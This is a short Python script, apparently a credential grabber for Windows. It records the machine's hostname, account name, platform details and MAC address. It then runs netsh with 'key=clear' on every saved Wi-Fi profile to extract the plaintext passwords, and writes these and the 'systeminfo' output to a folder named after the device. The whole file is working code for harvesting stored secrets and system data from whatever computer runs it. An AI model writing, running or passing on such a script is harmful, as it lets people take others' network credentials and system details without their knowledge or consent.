from rx7 import write,system
import os,socket,subprocess,pyautogui,re
import AD

Device_Name= socket.gethostname()+' - '+system.accname()
WIFIS=set(x[2:] for x in re.findall(r': .*', subprocess.getoutput('netsh wlan show profiles')))

def SysINFO():
    import platform,uuid,re
    write(f'.\\F\\{Device_Name}\\Info',mode='replace',text=f'SI:\n{platform.uname()}\nMac: {hex(uuid.getnode())}\n\nWIFI:\n{WIFIS}')
SysINFO()

write(f'.\\F\\{Device_Name}\\SystemINFO',subprocess.getoutput("systeminfo"))

dic={}
for wifi in WIFIS:
    a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
    try:
        new=re.search(r'Key Content.*',a)
        new=new.group()
        new= new[new.index(':')+2:]
        dic[wifi]=new   
    except:
        dic[wifi]=None
write(f'.\\F\\{Device_Name}\\WF PS',str(dic))
